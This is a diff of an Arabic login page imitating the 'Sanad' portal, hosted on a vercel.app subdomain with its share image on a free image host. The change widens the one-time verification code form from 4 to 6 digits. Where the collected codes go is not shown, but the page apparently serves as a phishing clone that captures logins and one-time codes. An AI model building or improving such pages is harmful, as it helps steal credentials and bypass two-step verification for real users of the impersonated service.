@@ -5,21 +5,18 @@
     <title>تسجيل الدخول - سند</title>
     <meta name="viewport" content="width=375, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
-
     <!-- وسوم Open Graph لمشاركة الرابط مع الشعار -->
     <meta property="og:type" content="website">
     <meta property="og:url" content="https://sanadjo.vercel.app/">
     <meta property="og:title" content="تسجيل الدخول - سند">
     <meta property="og:description" content="بوابة سند - تسجيل الدخول">
     <meta property="og:image" content="https://www2.0zz0.com/2025/07/08/07/530152226.png">
-
     <!-- وسوم Twitter Card -->
     <meta property="twitter:card" content="summary_large_image">
     <meta property="twitter:url" content="https://sanadjo.vercel.app/">
     <meta property="twitter:title" content="تسجيل الدخول - سند">
     <meta property="twitter:description" content="بوابة سند - تسجيل الدخول">
     <meta property="twitter:image" content="https://www2.0zz0.com/2025/07/08/07/530152226.png">
-
     <style>
         :root {
             --sanad-green: #00b874;
@@ -361,10 +358,12 @@
     <div class="modal-backdrop" id="modal-backdrop" style="display:none">
         <div class="modal" id="verification-modal">
             <div class="verify-label">
-                أدخل رمز التحقق المكون من 4 أرقام
+                أدخل رمز التحقق المكون من 6 أرقام
             </div>
             <form id="verifyForm">
                 <div class="code-inputs">
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" required />
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" required />
                     <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" required />
                     <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" required />
                     <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" required />
@@ -481,8 +480,8 @@
             verifyError.style.display = "none";
             const code = Array.from(document.querySelectorAll('.code-inputs input'))
                 .map(i => i.value.trim()).join('');
-            if (!/^\d{4}$/.test(code)) {
-                verifyError.innerText = "يرجى إدخال رمز صحيح مكون من 4 أرقام.";
+            if (!/^\d{6}$/.test(code)) {
+                verifyError.innerText = "يرجى إدخال رمز صحيح مكون من 6 أرقام.";
                 verifyError.style.display = "block";
                 // Reset inputs for re-entry
                 document.querySelectorAll('.code-inputs input').forEach(input => input.value = '');
